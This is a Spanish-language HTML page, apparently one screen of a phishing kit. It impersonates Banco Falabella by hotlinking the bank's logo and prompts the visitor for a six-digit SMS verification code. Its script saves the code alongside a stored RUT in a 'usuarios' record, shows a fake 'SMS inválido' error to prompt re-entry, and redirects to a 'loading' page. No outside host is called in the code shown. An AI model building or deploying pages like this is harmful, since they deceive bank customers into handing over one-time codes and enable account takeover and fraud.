<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingresar 6 Dígitos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #fff;
      color: #000;
      font-family: sans-serif;
      margin: 0;
      padding: 0;
    }

    .header {
      display: flex;
      align-items: center;
      padding: 10px;
      position: absolute;
      top: 0;
      left: 0;
    }

    .header img {
      width: 100px;
      max-width: 40vw;
      height: auto;
    }

    .main {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      text-align: center;
      height: 100vh;
      padding-top: 35vh;
    }

    .main h2 {
      margin-bottom: 20px;
      font-size: 1.2rem;
    }

    .container {
      display: flex;
      gap: 3vw;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 10vw;
      height: 10vw;
      max-width: 50px;
      max-height: 50px;
      font-size: 5vw;
      text-align: center;
      border: 2px solid #ccc;
      border-radius: 6px;
      background-color: #f8f8f8;
      color: #000;
    }

    input[type="text"]:focus {
      outline: none;
      border-color: #007bff;
    }

    .submit-btn {
      background-color: #28a745;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .submit-btn:hover {
      background-color: #218838;
    }

    #mensajeError {
      color: red;
      margin-top: 15px;
      display: none;
      font-size: 0.9rem;
    }

    @media (min-width: 600px) {
      input[type="text"] {
        width: 40px;
        height: 50px;
        font-size: 24px;
      }

      .main h2 {
        font-size: 1.5rem;
      }

      .header img {
        width: 120px;
      }

      .main {
        padding-top: 30vh;
      }

      .submit-btn {
        font-size: 1.1rem;
        padding: 14px 28px;
      }

      #mensajeError {
        font-size: 1rem;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="logo">
  </div>

  <div class="main">
    <h2>Ingrese el código</h2>
    <div class="container">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
      <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
    </div>
    <button class="submit-btn" id="btnIngresarCodigo">Ingresar</button>
    <p id="mensajeError">El SMS es inválido. Vuelva a intentarlo.</p>
  </div>
  <script>
    const inputs = document.querySelectorAll('input[type="text"]');
    const mensajeError = document.getElementById("mensajeError");

    // Mostrar mensaje rojo si viene desde "Error SMS"
    window.onload = () => {
      if (localStorage.getItem("errorSMS") === "true") {
        mensajeError.style.display = "block";
        localStorage.removeItem("errorSMS");
      }
    };

    // Avance automático entre inputs
    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    // Botón ingresar
    document.getElementById("btnIngresarCodigo").addEventListener("click", () => {
      const codigo = Array.from(inputs).map(i => i.value.trim()).join("");

      if (codigo.length === 6) {
        const rut = localStorage.getItem("rutParaSMS");
        let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];

        const usuario = usuarios.find(u => u.rut === rut);
        if (usuario) {
          usuario.sms = codigo;
          localStorage.setItem("usuarios", JSON.stringify(usuarios));
        }

        localStorage.removeItem("rutParaSMS");
        window.location.href = "../Login/pantalla-carga.html"; // Volver a pantalla de carga
      } else {
        alert("Debes ingresar los 6 dígitos completos.");
      }
    });
  </script>
</body>
</html>
